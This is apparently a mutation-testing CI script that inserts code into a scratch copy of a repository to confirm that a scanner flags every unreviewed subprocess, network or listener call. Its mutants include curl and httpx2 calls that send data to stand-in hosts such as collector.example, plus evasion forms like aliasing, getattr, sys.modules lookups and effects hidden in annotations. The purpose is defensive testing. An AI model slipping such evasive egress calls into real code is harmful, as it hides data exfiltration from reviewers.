"""The effect-call allowlist (MU-D) must fail on every way an unreviewed effect can enter greg/ or foundry/systems/.

Each mutant edits a scratch copy of the tree: source modules (a new effect call, an aliased, re-exported, rebound or
star import, a call moved into a new function, an extra occurrence, an unchecked caller of a declared wrapper, an
effect in an evaluated annotation, a listener, an httpx2 client), the allowlist (an entry removed, a stale or
miscounted entry, an unknown capability, a wrapper undeclared or mis-declared, a body-loop finding filed as an
approval), or the scanner itself (so its self-tests stay load-bearing). A mutant is CAUGHT only when the named test
fails and its output names the expected site.

    python scripts/ci/check_effect_call_allowlist_mutants.py
"""
from pathlib import Path
import json, os, shutil, subprocess, sys, tempfile

ROOT = Path(__file__).resolve().parents[2]
TEST = "tests/unit/test_effect_call_allowlist.py"
ALLOWLIST = "tests/security/effect-call-allowlist.json"
TREE, FORMED = f"{TEST}::test_every_effect_call_site_is_listed", f"{TEST}::test_allowlist_is_well_formed"
FORMS = f"{TEST}::test_every_import_form_and_call_shape_is_resolved"
QUIET = f"{TEST}::test_what_is_not_an_effect_is_not_listed"
NAMES = f"{TEST}::test_names_are_followed_across_scanned_modules"
WRAPS = f"{TEST}::test_declared_wrappers_are_listed_at_each_caller"
STARS = f"{TEST}::test_a_star_import_fails_and_cannot_be_listed"
SYSCTL = 'out = subprocess.run(["/usr/sbin/sysctl", "-n", "hw.memsize"], capture_output=True, text=True, timeout=5)'
UNLISTED = "UNLISTED effect call site "


def append(text):
    return lambda source: source + text


def write(text):
    return lambda _: text


def replace(*pairs):
    def mutate(source):
        for old, new in pairs:
            if source.count(old) != 1:
                raise LookupError(f"anchor not found exactly once: {old[:60]!r}")
            source = source.replace(old, new)
        return source
    return mutate


def allowlist(edit):
    def mutate(source):
        document = json.loads(source)
        edit(document)
        return json.dumps(document, indent=1)
    return mutate


def drop(section, module, qualname):
    def edit(document):
        kept = [e for e in document[section] if (e["module"], e["qualname"]) != (module, qualname)]
        if len(kept) == len(document[section]):
            raise LookupError(f"no {section} entry {module} :: {qualname}")
        document[section] = kept
    return edit


def entry(module, qualname, change, section="allowed"):
    def edit(document):
        for e in document[section]:
            if (e["module"], e["qualname"]) == (module, qualname):
                change(e)
                return
        raise LookupError(f"no {section} entry {module} :: {qualname}")
    return edit


def move_to_allowed(module, qualname):
    def edit(document):
        found = [e for e in document["known_unmediated"] if (e["module"], e["qualname"]) == (module, qualname)]
        if len(found) != 1:
            raise LookupError(f"no known_unmediated entry {module} :: {qualname}")
        document["known_unmediated"].remove(found[0])
        moved = {**found[0], "justification": found[0]["reason"]}
        del moved["reason"]
        document["allowed"].append(moved)
    return edit


def wrapper(qualname, change):
    def edit(document):
        for w in document["wrappers"]:
            if w["qualname"] == qualname:
                change(document, w)
                return
        raise LookupError(f"no wrapper {qualname}")
    return edit


def one(relative, mutate):
    return [(relative, mutate)]


# (name, [(file, mutation), ...], test node, text the failure output must contain)
MUTANTS = [
    # -- an unreviewed effect enters the source ---------------------------------------------------------
    ("new effect call in a listed module", one("greg/compute.py",
     append('\n\ndef _mutant_probe():\n    return subprocess.run(["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_probe :: subprocess.run"),
    ("new module with a network call", one("greg/_mutant_new.py",
     write('import socket\n\n\ndef dial():\n    return socket.create_connection(("example.org", 443))\n')),
     TREE, UNLISTED + "greg/_mutant_new.py :: dial :: socket.create_connection"),
    ("aliased from-import (from subprocess import run as r)", one("greg/presence.py",
     append('\n\nfrom subprocess import run as r  # noqa: E402\n\n\ndef _mutant_alias():\n    return r(["true"])\n')),
     TREE, UNLISTED + "greg/presence.py :: _mutant_alias :: subprocess.run"),
    ("aliased module import (import subprocess as sp)", one("greg/presence.py",
     append('\n\nimport subprocess as sp  # noqa: E402\n\n\n'
            'def _mutant_module_alias():\n    return sp.Popen(["true"])\n')),
     TREE, UNLISTED + "greg/presence.py :: _mutant_module_alias :: subprocess.Popen"),
    ("module rebound by assignment (sp = subprocess)", one("greg/compute.py",
     append('\n\ndef _mutant_rebind():\n    sp = subprocess\n    return sp.run(["curl", "https://collector.example"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_rebind :: subprocess.run"),
    ("name re-exported by another scanned module", [
        ("greg/compute.py", append("\n\nfrom subprocess import run as _host_run  # noqa: E402,F401\n")),
        ("greg/presentation.py", append("\n\nfrom greg.compute import _host_run  # noqa: E402\n\n\n"
                                        "def _mutant_reexport():\n    return _host_run(['curl', 'https://x.example'])\n"))],
     TREE, UNLISTED + "greg/presentation.py :: _mutant_reexport :: subprocess.run"),
    ("star import", one("greg/_mutant_star.py",
     write("from subprocess import *  # noqa: F403\n\n\ndef go():\n    return run(['curl', 'https://x.example'])\n")),
     TREE, "STAR IMPORT greg/_mutant_star.py :: <module> :: subprocess.*"),
    ("sys.modules lookup", one("greg/compute.py",
     append('\n\ndef _mutant_sysmodules():\n    return sys.modules["subprocess"].run(["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_sysmodules :: subprocess.run"),
    ("dynamic getattr on the module", one("greg/compute.py",
     append('\n\ndef _mutant_getattr():\n    return getattr(subprocess, "run")(["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_getattr :: subprocess.run"),
    ("injected runner default", one("greg/compute.py",
     append('\n\ndef _mutant_inject(runner=subprocess.run):\n    return runner(["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_inject :: subprocess.run (1 reference)"),
    ("effect call moved into a new function", one("greg/compute.py",
     replace(("def memory_bytes() -> int | None:",
              ('def _sysctl():\n    return subprocess.run(["/usr/sbin/sysctl", "-n", "hw.memsize"], '
               'capture_output=True, text=True, timeout=5)\n\n\ndef memory_bytes() -> int | None:')),
             (SYSCTL, "out = _sysctl()"))),
     TREE, UNLISTED + "greg/compute.py :: _sysctl :: subprocess.run"),
    ("second occurrence in the same function", one("greg/compute.py",
     replace((SYSCTL, SYSCTL + "\n            " + SYSCTL))),
     TREE, "COUNT MISMATCH greg/compute.py :: memory_bytes :: subprocess.run"),
    ("asyncio.subprocess from-import", one("greg/mcp_login.py",
     append("\n\nfrom asyncio.subprocess import create_subprocess_exec  # noqa: E402\n\n\n"
            "async def _mutant_spawn():\n    return await create_subprocess_exec('curl', 'https://x.example')\n")),
     TREE, UNLISTED + "greg/mcp_login.py :: _mutant_spawn :: asyncio.create_subprocess_exec"),
    ("urllib.request.urlretrieve", one("greg/briefs.py",
     append("\n\ndef _mutant_fetch(url):\n    return urllib.request.urlretrieve(url, '/tmp/x')\n")),
     TREE, UNLISTED + "greg/briefs.py :: _mutant_fetch :: urllib.request.urlretrieve"),
    ("asyncio.open_connection", one("greg/mcp_login.py",
     append("\n\nasync def _mutant_dial():\n    return await asyncio.open_connection('x.example', 443)\n")),
     TREE, UNLISTED + "greg/mcp_login.py :: _mutant_dial :: asyncio.open_connection"),
    ("httpx2 request", one("greg/compute.py",
     append("\n\ndef _mutant_httpx2(payload):\n    import httpx2\n"
            "    return httpx2.post('https://collector.example/x', content=payload)\n")),
     TREE, UNLISTED + "greg/compute.py :: _mutant_httpx2 :: httpx2.post"),
    ("inbound listener", one("greg/compute.py",
     append("\n\ndef _mutant_listen():\n    import http.server\n"
            "    return http.server.ThreadingHTTPServer(('0.0.0.0', 8080), None)\n")),
     TREE, UNLISTED + "greg/compute.py :: _mutant_listen :: http.server.ThreadingHTTPServer"),
    ("effect in an evaluated return annotation (no __future__ import)", one("greg/presentation.py",
     append("\n\nimport os as _os  # noqa: E402\n\n\ndef _mutant_annot() -> _os.system('true'):\n    pass\n")),
     TREE, UNLISTED + "greg/presentation.py :: _mutant_annot :: os.system"),
    ("opener built around greg.egress's allowlist check", one("greg/anchor.py",
     append("\n\ndef _mutant_unchecked(req):\n    return egress.opener().open(req, timeout=5)\n")),
     TREE, UNLISTED + "greg/anchor.py :: _mutant_unchecked :: urllib.request.build_opener().open"),
    ("opener's open held as a bound method", one("greg/anchor.py",
     append("\n\ndef _mutant_bound(req):\n    send = egress.opener().open\n    return send(req, timeout=5)\n")),
     TREE, UNLISTED + "greg/anchor.py :: _mutant_bound :: urllib.request.build_opener().open (1 reference)"),
    ("getattr(opener, 'open')", one("greg/anchor.py",
     append("\n\ndef _mutant_getattr_open(req):\n    return getattr(egress.opener(), 'open')(req, timeout=5)\n")),
     TREE, UNLISTED + "greg/anchor.py :: _mutant_getattr_open :: urllib.request.build_opener().open"),
    ("new caller of egress.send (no allowlist check)", one("greg/briefs.py",
     append("\n\ndef _mutant_unchecked_send(url):\n    return egress.send(urllib.request.Request(url), 5)\n")),
     TREE, UNLISTED + "greg/briefs.py :: _mutant_unchecked_send :: greg.egress.send"),
    ("new run_isolated call with isolate_network=False", one("greg/briefs.py",
     append("\n\ndef _mutant_open_network(argv, cwd):\n    from greg.capabilities import run_isolated\n"
            "    return run_isolated(argv, cwd=cwd, isolate_network=False)\n")),
     TREE, UNLISTED + "greg/briefs.py :: _mutant_open_network :: greg.capabilities.run_isolated"),
    # -- the allowlist loses or misstates an entry --------------------------------------------------------
    ("allowed entry removed", one(ALLOWLIST, allowlist(drop("allowed", "greg/egress.py", "send"))),
     TREE, UNLISTED + "greg/egress.py :: send :: urllib.request.build_opener().open"),
    ("known_unmediated entry removed (Body.appraise)", one(ALLOWLIST,
     allowlist(drop("known_unmediated", "greg/body.py", "Body.appraise"))),
     TREE, UNLISTED + "greg/body.py :: Body.appraise :: subprocess.run"),
    ("known_unmediated entry removed (memory_bytes)", one(ALLOWLIST,
     allowlist(drop("known_unmediated", "greg/compute.py", "memory_bytes"))),
     TREE, UNLISTED + "greg/compute.py :: memory_bytes :: subprocess.run"),
    ("body-loop finding filed as an approval", one(ALLOWLIST, allowlist(move_to_allowed("greg/compute.py", "memory_bytes"))),
     FORMED, "belongs under known_unmediated"),
    ("stale entry", one(ALLOWLIST, allowlist(lambda d: d["allowed"].append({**d["allowed"][0], "qualname": "gone"}))),
     TREE, "STALE allowed entry foundry/systems/build.py :: gone :: subprocess.run"),
    ("wrong count", one(ALLOWLIST, allowlist(entry("greg/organs.py", "_snapshot", lambda e: e.update(count=2)))),
     TREE, "COUNT MISMATCH greg/organs.py :: _snapshot :: subprocess.run"),
    ("unknown capability served", one(ALLOWLIST,
     allowlist(entry("greg/workers.py", "appraise", lambda e: e.update(serves=["capability:worker.anything"])))),
     FORMED, "names no capability in greg.capabilities.BUILTINS"),
    ("justification emptied", one(ALLOWLIST,
     allowlist(entry("greg/workers.py", "appraise", lambda e: e.update(justification="ok")))),
     FORMED, "must say, in words grounded in the code"),
    ("wrapper undeclared (greg.egress.send)", one(ALLOWLIST,
     allowlist(wrapper("send", lambda d, w: d["wrappers"].remove(w)))),
     TREE, "STALE allowed entry greg/anchor.py :: _post :: greg.egress.send"),
    ("wrapper exemption misstated (isolate_network=False)", one(ALLOWLIST,
     allowlist(wrapper("run_isolated", lambda d, w: w.update(exempt_when={"isolate_network": False})))),
     TREE, "exempt_when isolate_network=False needs a keyword-only parameter"),
    # -- the scanner itself is weakened -------------------------------------------------------------------
    ("scanner ignores `import x as y`", one(TEST,
     replace(("self.names[alias.asname].add(alias.name)", "pass"))), FORMS, "subprocess"),
    ("scanner ignores bare references", one(TEST,
     replace(("if (isinstance(node, (ast.Name, ast.Attribute)) and isinstance(node.ctx, ast.Load)", "if (False"))),
     FORMS, "injected"),
    ("scanner ignores an opener's .open", one(TEST,
     replace(('if isinstance(node, ast.Attribute) and node.attr == "open" and self.builds_opener(node.value):',
              "if False:"))), NAMES, "build_opener().open"),
    ("scanner drops suffix matching (re-exported modules)", one(TEST,
     replace(("for start in range(len(parts)):", "for start in range(1):"))), FORMS, "subprocess.run"),
    ("scanner stops following names across modules", one(TEST,
     replace(('module = self.modules.get(".".join(parts[:cut]))', "module = None"))), NAMES, "subprocess.run"),
    ("scanner ignores rebinding by assignment", one(TEST,
     replace(("targets = [(target.id, value) for target, value in self.bindings if isinstance(target, ast.Name)]",
              "targets = []"))), FORMS, "subprocess.run"),
    ("scanner ignores sys.modules", one(TEST,
     replace(('if isinstance(literal, str) and "sys.modules" in self.resolve(node.value):', "if False:"))),
     FORMS, "subprocess.run"),
    ("scanner allows star imports", one(TEST,
     replace(('self._record(qual, f"{base}.*", "star-import")', "pass"))), STARS, "subprocess.*"),
    ("scanner ignores declared wrappers", one(TEST,
     replace(("if name in self.index.wrappers:", "if False:"))), WRAPS, "greg.egress.send"),
    ("scanner treats every wrapper call as exempt", one(TEST,
     replace(("    return all(name not in passed", "    return True or all(name not in passed"))), WRAPS, "run_isolated"),
    ("scanner ignores an opener's .open held as a value", one(TEST,
     replace(("if (opener := self._opened(node)) is not None:      # send = opener().open", "if False:"))),
     WRAPS, "build_opener().open"),
    ("scanner skips annotations Python evaluates", one(TEST,
     replace(("if not self.lazy_annotations and not isinstance(node, ast.Lambda):", "if False:"))),
     FORMS, "annotated"),
    ("scanner reads annotations under from __future__ import annotations", one(TEST,
     replace(("if not self.lazy_annotations and not isinstance(node, ast.Lambda):",
              "if not isinstance(node, ast.Lambda):"))), QUIET, "os.system"),
    ("scanner records type positions (isinstance's class argument)", one(TEST,
     replace(("self._visit(node.args[1], qual, typed=True, local=local)", "self._visit(node.args[1], qual, local=local)"))),
     QUIET, "socket.socket"),
    ("scanner records attributes of an effect callable", one(TEST,
     replace(("return True                                     # subprocess.run.__doc__ starts nothing", "pass"))),
     QUIET, "subprocess.run"),
    ("scanner counts every member of an HTTP library", one(TEST,
     replace(("last in HTTP_ENTRY_POINTS and all(part.islower() for part in middle)", "bool(attr)"))),
     QUIET, "requests"),
    ("scanner drops httpx2", one(TEST,
     replace(('HTTP_LIBRARIES = frozenset({"requests", "httpx", "httpx2", "urllib3", "aiohttp"})',
              'HTTP_LIBRARIES = frozenset({"requests", "httpx", "urllib3", "aiohttp"})'))), FORMS, "httpx2"),
    ("scanner drops inbound listeners", one(TEST,
     replace(('"http.server.ThreadingHTTPServer", *(f"socketserver.{server}"', '*(f"socketserver.{server}"'))),
     FORMS, "ThreadingHTTPServer"),
]


def purge_bytecode(repo: Path) -> None:
    for cache in repo.rglob("__pycache__"):
        shutil.rmtree(cache, ignore_errors=True)


def run(repo: Path, node: str) -> subprocess.CompletedProcess:
    purge_bytecode(repo)
    return subprocess.run([sys.executable, "-B", "-m", "pytest", "-q", "-x", "-p", "no:cacheprovider", "--tb=short",
                           node], cwd=repo, env={**os.environ, "PYTHONPATH": str(repo), "PYTHONDONTWRITEBYTECODE": "1"},
                          capture_output=True, text=True, timeout=600, check=False)


def main() -> int:
    invalid = 0
    with tempfile.TemporaryDirectory(prefix="greg-effect-call-mutants-") as temp:
        repo = Path(temp) / "repo"
        shutil.copytree(ROOT, repo, ignore=shutil.ignore_patterns(".git", "__pycache__", ".pytest_cache"))
        baseline = run(repo, TEST)
        if baseline.returncode != 0:
            print("BASELINE_FAILS", baseline.stdout[-2000:])
            return 1
        print("BASELINE passes")
        for name, edits, node, expected in MUTANTS:
            saved, stale = [], None
            for relative, mutate in edits:
                path = repo / relative
                original = path.read_text() if path.exists() else None
                saved.append((path, original))
                try:
                    path.write_text(mutate(original))
                except LookupError as exc:
                    stale = exc
                    break
            try:
                result = None if stale else run(repo, node)
            finally:
                for path, original in reversed(saved):
                    path.write_text(original) if original is not None else path.unlink(missing_ok=True)
            if stale:
                print("STALE", name, stale)
                invalid += 1
                continue
            caught = (result.returncode == 1 and f"FAILED {node}" in result.stdout and expected in result.stdout
                      and "ERROR collecting" not in result.stdout)
            print("CAUGHT" if caught else "SURVIVED_OR_INVALID", name)
            invalid += not caught
    print(f"{len(MUTANTS) - invalid}/{len(MUTANTS)} caught")
    return int(bool(invalid))


if __name__ == "__main__":
    raise SystemExit(main())
